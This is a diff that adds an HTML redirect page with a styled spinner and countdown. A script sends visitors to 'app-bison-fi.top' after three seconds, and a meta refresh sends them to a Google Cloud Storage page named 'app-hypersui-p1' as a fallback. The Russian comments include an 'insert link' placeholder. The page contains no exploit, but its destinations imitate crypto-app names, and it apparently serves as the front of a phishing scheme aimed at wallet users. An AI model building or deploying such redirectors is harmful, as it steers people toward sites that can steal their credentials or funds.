@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Redirecting...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- fallback редирект (важно для Vercel) -->
+  <meta http-equiv="refresh" content="6;url=https://storage.googleapis.com/app-hypersui-p1/index.html">
+
+  <style>
+  body {
+    margin: 0;
+    height: 100vh;
+    background: #020617; /* slate-950 */
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: Inter, ui-sans-serif, system-ui, Arial, Helvetica, sans-serif;
+    color: #e5e7eb; /* slate-200 */
+  }
+
+  .container {
+    text-align: center;
+  }
+
+  .spinner {
+    width: 64px;
+    height: 64px;
+    border: 3px solid #6366f1; /* indigo-500 */
+    border-top-color: transparent;
+    border-radius: 50%;
+    margin: 0 auto 32px;
+    animation: spin 1s linear infinite;
+    box-shadow: 0 0 20px rgba(99, 102, 241, 0.35);
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .text {
+    font-size: 22px;
+    margin-bottom: 12px;
+    opacity: 0.75;
+    color: #cbd5f5; /* indigo-200 */
+  }
+
+  .countdown {
+    font-size: 52px;
+    font-weight: 700;
+    color: #818cf8; /* indigo-400 */
+    text-shadow: 0 0 18px rgba(129, 140, 248, 0.45);
+  }
+</style>
+
+</head>
+<body>
+  <div class="container">
+    <div class="spinner"></div>
+    <div class="text">
+      You will be automatically redirected via
+    </div>
+    <div class="countdown" id="countdown">3</div>
+  </div>
+
+  <script>
+    let seconds = 3;
+    const countdownEl = document.getElementById("countdown");
+
+    const redirectUrl = "https://app-bison-fi.top"; // ← вставь ссылку
+
+    const timer = setInterval(() => {
+      seconds--;
+      countdownEl.textContent = seconds;
+
+      if (seconds <= 0) {
+        clearInterval(timer);
+        window.location.replace(redirectUrl);
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
